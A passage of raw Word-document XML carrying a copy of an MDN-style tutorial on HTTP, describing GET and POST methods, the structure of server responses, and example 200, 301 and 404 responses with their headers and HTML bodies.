          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>The </w:t>
      </w:r>
      <w:hyperlink r:id="rId275" w:tooltip="The HTTP GET method requests a representation of the specified resource. Requests using GET should only retrieve data." w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTMLCode"/>
            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:color w:val="3F87A6"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>GET</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> method requests a data representation of the specified resource. Requests using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> should only retrieve data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="207"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>The </w:t>
      </w:r>
      <w:hyperlink r:id="rId276" w:tooltip="The HTTP POST method sends data to the server. The type of the body of the request is indicated by the Content-Type header." w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTMLCode"/>
            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:color w:val="3F87A6"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>POST</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> method sends data to a server so it may change its state. This is the method often used for </w:t>
      </w:r>
      <w:hyperlink r:id="rId277" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
            <w:color w:val="3F87A6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>HTML Forms</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="1545" w:beforeAutospacing="0" w:after="300" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Structure of a server response</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After the connected agent has sent its request, the web server processes it, and ultimately returns a response. Similar to a client request, a server response is formed of text directives, separated by CRLF, though divided into three blocks:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="208"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>The first line, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>status line</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>, consists of an acknowledgment of the HTTP version used, followed by a status request (and its brief meaning in human-readable text).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="208"/>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 xml:space="preserve">Subsequent lines represent specific HTTP headers, giving the client information about the data sent (e.g. type, data size, compression algorithm used, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>hints</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> about caching). Similarly to the block of HTTP headers for a client request, these HTTP headers form a block ending with an empty line.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="208"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="90" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>The final block is a data block, which contains the optional data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="highlight-span"/>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="333333"/>
        </w:rPr>
        <w:t>Example responses</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Successful web page response:</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HTTP/1.1 200 OK</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Date: Sat, 09 Oct 2010 14:28:02 GMT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Server: Apache</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Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT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roofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>ETag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>: "51142bc1-7449-479b075b2891b"</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Accept-Ranges: bytes</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Content-Length: 29769</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Content-Type: text/html</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Fonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> html... (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>here</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> comes the 29769 bytes of the requested web page)</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Notification that the requested resource has permanently moved:</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HTTP/1.1 301 Moved Permanently</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Server: Apache/2.2.3 (Red Hat)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Content-Type: text/html; charset=iso-8859-1</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Date: Sat, 09 Oct 2010 14:30:24 GMT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Location: https://developer.mozilla.org/ (this is the new link to the resource; it is expected that the user-agent will fetch it)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Keep-Alive: timeout=15, max=98</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Accept-Ranges: bytes</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Via: Moz-Cache-zlb05</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Connection: Keep-Alive</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X-Cache-Info: caching</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X-Cache-Info: caching</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Content-Length: 325 (the content contains a default page to display if the user-agent is not able to follow the link)</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roofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="708090"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="708090"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;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lastRenderedPageBreak/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="990055"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>html</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&gt;&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="990055"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>head</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proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="990055"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>title</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>301 Moved Permanently</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title</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head</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&gt;&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="990055"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>body</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h1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Moved Permanently</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h1</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p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>The</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> document has moved </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 xml:space="preserve">a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="669900"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>href</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>="</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0077AA"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>https://developer.mozilla.org/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>here</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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>.</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p</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proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="990055"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>hr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>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address</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Apache/2.2.3 (Red Hat) Server at developer.mozilla.org Port 80</w:t>
      </w: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address</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&gt;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Fonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&lt;/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="990055"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>body</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&gt;&lt;/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="990055"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="360" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Notification that the requested resource doesn't exist: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HTTP/1.1 404 Not Found</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Date: Sat, 09 Oct 2010 14:33:02 GMT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Server: Apache</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Last-Modified: Tue, 01 May 2007 14:24:39 GMT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roofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>ETag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>: "499fd34e-29ec-42f695ca96761</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>;48fe7523cfcc1</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>"</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Accept-Ranges: bytes</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Content-Length: 10732</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Content-Type: text/html</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Style w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> html... (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>contains</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> a site-customized page helping the user to find the </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="2" w:space="11" w:color="3F87A6"/>
          <w:left w:val="single" w:sz="24" w:space="31" w:color="3F87A6"/>
          <w:bottom w:val="single" w:sz="2" w:space="11" w:color="3F87A6"/>
          <w:right w:val="single" w:sz="24" w:space="11" w:color="3F87A6"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
